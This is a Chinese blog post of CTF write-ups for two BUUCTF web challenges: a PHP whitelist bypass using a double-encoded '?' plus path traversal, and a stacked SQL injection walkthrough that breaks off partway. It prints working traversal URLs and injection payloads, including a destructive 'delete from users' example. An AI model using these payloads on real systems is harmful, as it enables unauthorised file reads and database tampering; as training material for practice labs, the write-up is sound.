<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>BUUCTF题 | 栈桥仔</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="[TOC] [HCTF 2018]WarmUp打开页面  查看源码看看 访问这个文件  查看源码  而且观察顶部代码发现有一个hint.php的文件，查看一下 告诉我们flag在ffffllllaaaagggg中。   回到source.php代码 首先看下面部分: 12345678910111213# 字符不能为空if (! empty($_REQUEST[&#39;file&#39;])# 提">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF题">
<meta property="og:url" content="https://zhanqiaozai.github.io/2020/07/25/BUUCTF%E9%A2%98/index.html">
<meta property="og:site_name" content="栈桥仔">
<meta property="og:description" content="[TOC] [HCTF 2018]WarmUp打开页面  查看源码看看 访问这个文件  查看源码  而且观察顶部代码发现有一个hint.php的文件，查看一下 告诉我们flag在ffffllllaaaagggg中。   回到source.php代码 首先看下面部分: 12345678910111213# 字符不能为空if (! empty($_REQUEST[&#39;file&#39;])# 提">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113206180.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113313805.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113412110.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616114219183.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616140331329.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155324366.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155437231.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155537988.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155639126.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155743896.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155845687.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160014968.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160051149.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616164158609.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230414826.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230527277.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230539819.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230544576.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616230851120.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616231105904.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090723586.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090900746.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090919670.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617090958992.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091135646.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091234044.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091425914.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617091416354.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617095216591.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103924552.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103941403.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617103948371.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104507291.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617104841639.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105527432.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617105952296.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617110059578.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121622838.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121702435.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617121751729.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617142755512.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150348928.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617150801953.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155127550.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155219302.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155250871.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155323634.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155413109.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155536349.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617155654022.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617161654507.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180807334.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617180838843.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200617194252428.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154326790.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154426285.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154519487.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619154853693.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155011435.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155036006.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155229344.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155320193.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155343358.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155450550.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155629096.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200619155856927.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620181135515.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182053874.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620182353231.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620185451166.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620184615544.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620222538324.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223047850.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620223209799.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224157308.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620224350841.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225047364.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225146776.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225323155.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225802515.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225851432.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620225940707.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230237557.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230404458.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230449555.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200620230538643.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621121654181.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621122341875.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123038660.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123717787.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621123849566.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621124040452.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161807677.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621161914064.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162103524.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621162147692.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163343886.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621163431390.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233751090.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621233900931.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234138692.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234352974.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200621234442026.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165408704.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165624243.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622165641410.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622171254105.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622173524051.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105401888.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105918392.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110015243.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224005633.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224044845.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224125099.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224434281.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224915250.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225025442.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225417922.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110847751.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121553540.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121724839.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145137116.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145521140.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145715604.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151332056.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151616984.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151737736.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151828372.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152017864.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152112746.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152205359.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152322218.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152456577.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152543535.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152706908.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152820412.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152946936.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153426029.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153518638.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153720139.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704162008606.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704203423964.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704204528471.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205638988.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205709535.png">
<meta property="article:published_time" content="2020-07-25T01:17:12.594Z">
<meta property="article:modified_time" content="2020-07-25T01:38:00.495Z">
<meta property="article:author" content="zhanqiaozai">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113206180.png">
  
    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">zhanqiaozai</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-BUUCTF题" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/BUUCTF%E9%A2%98/" class="article-date">
  	<time datetime="2020-07-25T01:17:12.594Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      BUUCTF题
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113206180.png" alt="image-20200616113206180"></p>
<p>查看源码看看</p>
<p>访问这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113313805.png" alt="image-20200616113313805"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616113412110.png" alt="image-20200616113412110"></p>
<p>而且观察顶部代码发现有一个hint.php的文件，查看一下</p>
<p>告诉我们flag在ffffllllaaaagggg中。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616114219183.png" alt="image-20200616114219183"></p>
<p> 回到source.php代码<br> 首先看下面部分:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 字符不能为空</span><br><span class="line">if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line"># 提交变成字符串形式</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line"># 通过checkFile校验</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];	# 包含$_REQUEST[&#39;file&#39;]文件</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    # 打印滑稽表情</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>if语句传入file变量满足三个条件</p>
<ul>
<li>非空</li>
<li>类型为字符串</li>
<li>能够通过checkFile()函数校验</li>
</ul>
<p>只有同时满足这三个条件才能打印file中的文件，否则打印滑稽表情</p>
<p>查看checkFile()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># 高光显示</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"># 定义一个emmm的类</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line"># 将传入的参数赋值给$page</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">        # 声明$whitelist白名单数组</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];	</span><br><span class="line">            </span><br><span class="line">        # 若$page不存在或者不是字符串    </span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        # 打印you can&#39;t see it</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">		# 判断变量$page存在$whitelist数组中</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        # 返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">		# 截取$page中&#39;?&#39;前部分，若无则取整个$page</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">        # 判断截取完的$page是否在在白名单中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        # 在返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">		# url解码</span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            </span><br><span class="line">        # 在进行截取......</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">        # 判断截取完的$page是否在在白名单中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        # 在返回true</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        # 否则返回false</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数代码中有四个if语句</p>
<ul>
<li>第一个if语句对变量进行检验，要求$page为字符串，否则返回false</li>
<li>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true</li>
<li>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</li>
<li>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br> 若以上四个if语句均未返回值，则返回false</li>
</ul>
<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br> 第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br> 第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：</p>
<p><code>http://***:***/source.php/%253f../ffffllllaaaagggg</code></p>
<p>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在</p>
<p><code>http://***:***/source.php/%253f../../../../../ffffllllaaaagggg</code>成功回显flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616140331329.png" alt="image-20200616140331329"></p>
<h3 id="强网杯-2019-随便注1"><a href="#强网杯-2019-随便注1" class="headerlink" title="[强网杯 2019]随便注1"></a>[强网杯 2019]随便注1</h3><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p>
<h4 id="堆叠原理"><a href="#堆叠原理" class="headerlink" title="堆叠原理"></a>堆叠原理</h4><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
<h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了。</p>
<p><code>mysql&gt; select * from users where id =1;delete from users;</code></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155324366.png" alt="image-20200616155324366"></p>
<p>使用 or 可以把表中所有数据都查询出来，但是并没有我们需要的flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155437231.png" alt="image-20200616155437231"></p>
<p>使用order by查看字段数，当order by 2的时候返回正常，order by 3就出错了，只有两个字段，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155537988.png" alt="image-20200616155537988"></p>
<p>这时候用union select进行联合查询，返回一个正则过滤规则，可以看到几乎所有的字段都过滤了，所以这里用堆叠注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155639126.png" alt="image-20200616155639126"></p>
<p>查看当前数据库，可以看到成功了，存在堆叠注入，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155743896.png" alt="image-20200616155743896"></p>
<p>我们在用show tables来查询一下能不能查出表，有两张表，分别看看两张表有什么字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616155845687.png" alt="image-20200616155845687"></p>
<p>使用一下命令来查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;show columns from &#96;words&#96; ;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160014968.png" alt="image-20200616160014968"></p>
<p>并没有flag，查看另一张表，可以看到有flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0’; show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616160051149.png" alt="image-20200616160051149"></p>
<p>注意：在windows系统下，反单引号(`)是数据库、表、索引、列和别名用的引用符</p>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM &#96;table&#96; WHERE &#96;id&#96; &#x3D; &#39;123&#39; ;</span><br></pre></td></tr></table></figure>

<p>其中1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关。</p>
<p>查看一下words表结构，发现有id和data两个字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200616164158609.png" alt="image-20200616164158609"></p>
<p>因为这里有两张表，会县内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢</p>
